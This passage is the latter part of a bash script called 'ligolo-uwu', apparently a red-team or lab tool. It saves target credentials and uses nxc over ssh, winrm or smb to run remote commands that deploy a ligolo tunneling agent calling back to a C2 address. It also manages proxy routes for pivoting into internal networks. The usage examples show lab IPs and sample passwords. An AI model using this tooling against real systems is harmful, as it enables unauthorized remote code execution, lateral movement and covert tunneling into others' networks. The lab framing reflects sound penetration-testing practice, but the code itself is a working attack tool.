            timeout 10 bash -c "nxc '$protocol' '$ip' -u '$user' -p '$pass' $local_auth_flag $exec_flag '${exec_cmd}' $exec_method" 2>&1 || true

            # Also run a simple test
            log "DEBUG" "Running simple test command..."
            nxc "$protocol" "$ip" -u "$user" -p "$pass" $local_auth_flag -x 'echo test' $exec_method
        else
            timeout 5 bash -c "nxc '$protocol' '$ip' -u '$user' -p '$pass' $local_auth_flag $exec_flag '${exec_cmd}' $exec_method" &>/dev/null || true
        fi

        log "INFO" "✓ Agent execution command sent"
    fi

    # Give agent time to connect
    log "INFO" "Waiting for agent to establish connection..."
    sleep 5

    log "INFO" "✓ Agent deployment completed for $ip"
    log "INFO" "Check your ligolo proxy for incoming connection from $ip"
}

# List saved targets
list_targets() {
    if [[ ! -f "$CONFIG_FILE" ]]; then
        log "INFO" "No saved targets found"
        return 0
    fi

    echo -e "${BLUE}Saved Targets:${NC}"
    echo "=============="
    printf "%-15s %-15s %-10s %-15s %-6s %-8s %s\n" "NAME" "IP" "USER" "C2_IP" "C2_PORT" "PROTOCOL" "LOCAL_AUTH"
    echo "--------------------------------------------------------------------------------------------"

    while IFS=':' read -r name ip user pass c2_ip c2_port protocol local_auth; do
        # Default local_auth to false if not present (backward compatibility)
        local_auth="${local_auth:-false}"
        printf "%-15s %-15s %-10s %-15s %-6s %-8s %s\n" "$name" "$ip" "$user" "$c2_ip" "$c2_port" "$protocol" "$local_auth"
    done < "$CONFIG_FILE"
}

# Remove saved target
remove_target() {
    local name="$1"

    if [[ ! -f "$CONFIG_FILE" ]]; then
        error_exit "No saved targets found"
    fi

    if ! grep -q "^${name}:" "$CONFIG_FILE"; then
        error_exit "Target $name not found"
    fi

    grep -v "^${name}:" "$CONFIG_FILE" > "${CONFIG_FILE}.tmp"
    mv "${CONFIG_FILE}.tmp" "$CONFIG_FILE"

    log "INFO" "Target $name removed successfully"
}

# Usage information
usage() {
    show_banner
    
    # Determine if running from installed location
    local cmd_name="ligolo-uwu"
    if [[ "$SCRIPT_DIR" != "/opt/ligolo-uwu" ]]; then
        cmd_name="./ligolo-uwu.sh"
    fi
    
    cat << EOF
${CYAN}Usage:${NC}
  ${GREEN}Installation:${NC}
    $cmd_name install                               - Install globally to /opt
    $cmd_name clean                                 - Clean up all lab files
    $cmd_name clean --uninstall                     - Clean up and uninstall

  ${GREEN}Proxy Management:${NC}
    $cmd_name proxy <port> [interface]              - Start ligolo proxy server
    $cmd_name download                              - Download latest ligolo binaries

  ${GREEN}Route Management:${NC}
    $cmd_name route <network>                       - Add route to ligolo interface
    $cmd_name route-del <network>                   - Remove route from ligolo interface
    $cmd_name routes                                - List all ligolo routes

  ${GREEN}Agent Deployment:${NC}
    $cmd_name agent <target_name> [protocol]        - Deploy to saved target
    $cmd_name <ip> <user> <pass> <c2_ip> <c2_port> <protocol> [--local-auth] [--debug] - Quick deploy and save

  ${GREEN}Target Management:${NC}
    $cmd_name add <n> <ip> <user> <pass> <c2_ip> <c2_port> <protocol> [--local-auth] [--debug] - Add target and deploy
    $cmd_name list                                  - List saved targets
    $cmd_name remove <target_name>                  - Remove saved target

${CYAN}Protocol Options:${NC}
    ssh    - For Linux targets
    winrm  - For Windows targets (uses PowerShell)
    smb    - For Windows targets (uses cmd.exe)

${CYAN}Authentication Options:${NC}
    --local-auth     - Use local authentication (for winrm/smb)
    --debug          - Enable debug output

${CYAN}Examples:${NC}
  ${YELLOW}# Install globally first${NC}
  $cmd_name install                      # Install to /opt, available as 'ligolo-uwu'

  ${YELLOW}# Start proxy server with specific interface${NC}
  ligolo-uwu proxy 443                   # Auto-detect interface
  ligolo-uwu proxy 443 tun0              # Use tun0 for all deployments
  ligolo-uwu proxy 443 eth0              # Use eth0 for all deployments

  ${YELLOW}# Route management${NC}
  ligolo-uwu route 172.16.70.0           # Add route for 172.16.70.0/24
  ligolo-uwu route 10.10.10.0/16         # Add route with custom CIDR
  ligolo-uwu routes                      # List all routes
  ligolo-uwu route-del 172.16.70.0       # Remove route

  ${YELLOW}# Windows targets${NC}
  ligolo-uwu add WIN01 172.16.0.150 administrator 'Password1' 10.10.14.21 443 winrm
  ligolo-uwu add WIN02 172.16.0.150 administrator 'Password1' 10.10.14.21 443 winrm --local-auth
  ligolo-uwu add WIN03 172.16.0.150 ghoul 'Vaultboy4Prez!' 10.10.14.21 443 smb

  ${YELLOW}# Linux targets${NC}
  ligolo-uwu add LINUX01 10.10.110.25 house Lucky38 10.10.14.21 443 ssh

  ${YELLOW}# Quick deploy with debug${NC}
  ligolo-uwu 172.16.0.150 administrator 'Password1' 10.10.14.21 443 winrm --debug
  ligolo-uwu 172.16.0.150 administrator 'Password1' 10.10.14.21 443 smb --local-auth --debug

  ${YELLOW}# Deploy to saved target${NC}
  ligolo-uwu agent WIN01

  ${YELLOW}# Clean up lab environment${NC}
  ligolo-uwu clean                       # Remove all routes, configs, logs
  ligolo-uwu clean --uninstall           # Clean everything and uninstall

${CYAN}Installation Details:${NC}
  - Global installation: /opt/ligolo-uwu
  - Global command: ligolo-uwu (in /usr/local/bin)
  - All data stored in /opt for centralized management
  - Clean command removes routes, configs, logs, and binaries
  - Uninstall option removes everything including global command

${CYAN}Troubleshooting:${NC}
  - Use --debug flag to see actual commands being run
  - Check logs: tail -f /opt/ligolo-uwu/ligolo.log (if installed globally)
  - Verify binaries: ls -la /opt/ligolo-uwu/ligolo-binaries/
  - Test connectivity: nxc <protocol> <ip> -u <user> -p <pass> [--local-auth]
  - Clean up lab: ligolo-uwu clean

EOF
}

# Main function
main() {
    # Create log file if it doesn't exist
    touch "$LOG_FILE"

    # Check for debug flag in arguments
    local args=("$@")
    for ((i=0; i<${#args[@]}; i++)); do
        if [[ "${args[i]}" == "--debug" ]]; then
            DEBUG_MODE=true
            # Remove debug flag from arguments
            unset 'args[i]'
            args=("${args[@]}")  # Reindex array
            break
        fi
    done

    case "${args[0]:-help}" in
        "install")
            install_globally
            ;;
        "clean")
            clean_lab "${args[1]:-}"
            ;;
        "proxy")
            if [[ ${#args[@]} -lt 2 ]]; then
                error_exit "Usage: ligolo-uwu proxy <port> [interface]"
            fi
            check_dependencies
            start_proxy "${args[1]}" "${args[2]:-}"
            ;;
        "route")
            if [[ ${#args[@]} -lt 2 ]]; then
                error_exit "Usage: ligolo-uwu route <network>"
            fi
            add_route "${args[1]}"
            ;;
        "route-del"|"route-delete"|"del-route")
            if [[ ${#args[@]} -lt 2 ]]; then
                error_exit "Usage: ligolo-uwu route-del <network>"
            fi
            remove_route "${args[1]}"
            ;;
        "routes"|"route-list"|"list-routes")
            list_routes
            ;;
        "agent")
            if [[ ${#args[@]} -lt 2 ]]; then
                error_exit "Usage: ligolo-uwu agent <target_name> [protocol]"
            fi
            check_dependencies
            ensure_binaries

            local target_name="${args[1]}"
            local forced_protocol="${args[2]:-}"

            load_target "$target_name"

            # Use forced protocol if specified, otherwise use saved protocol
            local deploy_protocol="$TARGET_PROTOCOL"
            if [[ -n "$forced_protocol" ]]; then
                deploy_protocol="$forced_protocol"
                log "INFO" "Using forced protocol: $deploy_protocol"
            else
                log "INFO" "Using saved protocol: $deploy_protocol"
            fi

            deploy_agent "$TARGET_IP" "$TARGET_USER" "$TARGET_PASS" "$TARGET_C2_IP" "$TARGET_C2_PORT" "$deploy_protocol" "$TARGET_LOCAL_AUTH"
            ;;
        "add")
            if [[ ${#args[@]} -lt 8 ]]; then
                error_exit "Usage: ligolo-uwu add <n> <ip> <user> <pass> <c2_ip> <c2_port> <protocol> [--local-auth]"
            fi
            check_dependencies
            ensure_binaries

            local name="${args[1]}"
            local ip="${args[2]}"
            local user="${args[3]}"
            local pass="${args[4]}"
            local c2_ip="${args[5]}"
            local c2_port="${args[6]}"
            local protocol="${args[7]}"
            local local_auth="false"

            # Check for --local-auth flag
            if [[ "${args[8]:-}" == "--local-auth" ]]; then
                local_auth="true"
            fi

            # Validate protocol
            if [[ ! "$protocol" =~ ^(ssh|winrm|smb)$ ]]; then
                error_exit "Invalid protocol. Use: ssh, winrm, or smb"
            fi

            save_target "$name" "$ip" "$user" "$pass" "$c2_ip" "$c2_port" "$protocol" "$local_auth"
            deploy_agent "$ip" "$user" "$pass" "$c2_ip" "$c2_port" "$protocol" "$local_auth"
            ;;
        "list")
            list_targets
            ;;
        "remove")
            if [[ ${#args[@]} -lt 2 ]]; then
                error_exit "Usage: ligolo-uwu remove <target_name>"
            fi
            remove_target "${args[1]}"
            ;;
        "download")
            check_dependencies
            download_ligolo
            ;;
        "help"|"--help"|"-h")
            usage
            ;;
        *)
            # Quick deploy mode: ip user pass c2_ip c2_port protocol [--local-auth]
            if [[ ${#args[@]} -ge 6 ]]; then
                check_dependencies
                ensure_binaries

                local ip="${args[0]}"
                local user="${args[1]}"
                local pass="${args[2]}"
                local c2_ip="${args[3]}"
                local c2_port="${args[4]}"
                local protocol="${args[5]}"
                local local_auth="false"

                # Check for --local-auth flag
                if [[ "${args[6]:-}" == "--local-auth" ]]; then
                    local_auth="true"
                fi

                # Validate protocol
                if [[ ! "$protocol" =~ ^(ssh|winrm|smb)$ ]]; then
                    error_exit "Invalid protocol. Use: ssh, winrm, or smb"
                fi

                # Generate target name from IP
                local target_name="target_$(echo "$ip" | tr '.' '_')"

                save_target "$target_name" "$ip" "$user" "$pass" "$c2_ip" "$c2_port" "$protocol" "$local_auth"
                deploy_agent "$ip" "$user" "$pass" "$c2_ip" "$c2_port" "$protocol" "$local_auth"
            else
                usage
            fi
            ;;
    esac
}

# Run main function with all arguments
main "$@"
